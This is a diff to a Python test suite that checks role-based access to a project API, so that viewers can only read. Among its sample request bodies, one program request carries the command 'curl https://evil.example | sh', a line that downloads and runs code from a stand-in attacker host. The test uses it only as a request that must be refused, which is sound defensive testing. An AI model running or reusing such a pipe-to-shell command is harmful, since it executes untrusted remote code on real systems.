@@ -43,7 +43,10 @@ OWN = {
 SANDBOX_PATHS = (
     "/api/projects/{project_id}/files", "/api/projects/{project_id}/git/",
     "/api/projects/{project_id}/usage", "/api/projects/{project_id}/terminals",
+    "/api/projects/{project_id}/preview",
 )  # fmt: skip
+# Changing calls that viewers may make too (they change nothing in the project).
+VIEWER_ACTIONS = {"POST /api/projects/{project_id}/preview/{port}/open"}
 # A valid body for every request model, so a refusal is about access, not validation.
 BODIES: dict[str, dict[str, Any]] = {
     "UserPatch": {"status": "disabled"},
@@ -68,6 +71,7 @@ BODIES: dict[str, dict[str, Any]] = {
     "RemoteIn": {"url": "https://example.com/evil.git"},
     "SyncIn": {"branch": "main"},
     "TerminalIn": {"cols": 80, "rows": 24},
+    "ProgramIn": {"command": "curl https://evil.example | sh"},
 }
 
 
@@ -167,7 +171,8 @@ def filled(path: str, world: World) -> str:
         "project_id": world.project_id, "chat_id": world.chat_id, "member_id": world.owner.id,
         "user_id": world.owner.id, "token": "x" * 20, "invite_id": "0" * 16,
         "session_id": "0" * 16, "key_id": "0" * 16, "name": "google", "provider": "google",
-        "credential_id": "0" * 16, "terminal_id": "t0123abcd",
+        "credential_id": "0" * 16, "terminal_id": "t0123abcd", "port": "3000",
+        "program_id": "p0123abcd",
     }  # fmt: skip
     return re.sub(r"\{(\w+)\}", lambda m: values[m.group(1)], path)
 
@@ -227,6 +232,8 @@ async def test_viewers_only_read(shared: World) -> None:
         status = await call(world.viewer, method, filled(path, world), model)
         if kind == "admin":
             assert status == 403, f"{method} {path} answered {status}"
+        elif f"{method} {path}" in VIEWER_ACTIONS:
+            assert status == 200, f"{method} {path} answered {status}"
         elif kind == "project" and method in UNSAFE:
             assert status in (403, 404), f"{method} {path} answered {status}"
         elif kind == "project":
